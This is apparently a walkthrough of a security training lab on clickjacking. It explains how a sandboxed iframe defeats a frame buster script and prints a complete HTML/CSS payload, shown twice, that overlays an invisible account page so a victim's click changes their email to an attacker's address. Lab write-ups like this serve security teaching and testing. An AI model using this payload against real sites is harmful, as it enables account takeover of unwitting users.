## Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note :

The victim will be using Chrome so test your exploit on that browser.

Hint : 

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Exploit Server

## Resume

1. Identify the frame buster protection
2. Use a sandboxed iframe to bypass the protection
3. Load the account page inside the iframe
4. Prefill the email parameter with attacker-controlled data
5. Make the iframe transparent
6. Align fake content with the real `Update email` button
7. Deliver the exploit to the victim

## Solve

The application attempts to defend against clickjacking using a frame buster script similar to:

```javascript
if(top != self) {
    top.location = self.location;
}
```

Normally, this prevents the page from being embedded inside an iframe because the script forces the top-level window to navigate away.

However, the protection can be bypassed using the iframe sandbox attribute:

```html
sandbox="allow-forms"
```

The sandbox prevents the framed page from executing actions such as:

```javascript
top.location = self.location;
```

while still allowing form submissions.

The attacker loads the vulnerable account page inside a sandboxed iframe:

```html
<iframe
src="https://0a750087037c662e80112128007000e0.web-security-academy.net/my-account?email=hacker@labs.com"
sandbox="allow-forms">
</iframe>
```

The vulnerable page automatically fills the email form using:

```text
?email=hacker@labs.com
```

This allows the attacker to control the email address submitted when the victim clicks the button.

The iframe is then made almost completely invisible using:

```css
opacity: 0.00001;
```

The exploit places the iframe above visible bait content using:

```css
z-index: 2;
```

while the decoy content remains underneath:

```css
z-index: 1;
```

The fake visible text:

```html
<div>click</div>
```

is aligned with the real:

```text
Update email
```

button inside the transparent iframe.

When the victim attempts to click the visible bait content, the browser actually sends the click to the hidden button inside the iframe.

Exploit payload:

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:510;
        left:70;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe
src="https://0a750087037c662e80112128007000e0.web-security-academy.net/my-account?email=hacker@labs.com"
sandbox="allow-forms"></iframe>
```

Breakdown:

- `sandbox="allow-forms"` → disables the frame buster while still allowing form submission
- `opacity:0.00001` → makes the iframe invisible
- `z-index:2` → positions the iframe above the visible bait
- `top:510` and `left:70` → align the fake text with the real button
- `email=hacker@labs.com` → pre-fills the victim form with attacker-controlled data

The victim only sees:

```text
click
```

but actually interacts with:

```text
Update email
```

inside the hidden iframe.

As a result, the victim unknowingly submits the form and changes the account email address to the attacker-controlled value.

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:510;
        left:70;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe
src="https://0a750087037c662e80112128007000e0.web-security-academy.net/my-account?email=hacker@labs.com"
sandbox="allow-forms"></iframe>
```
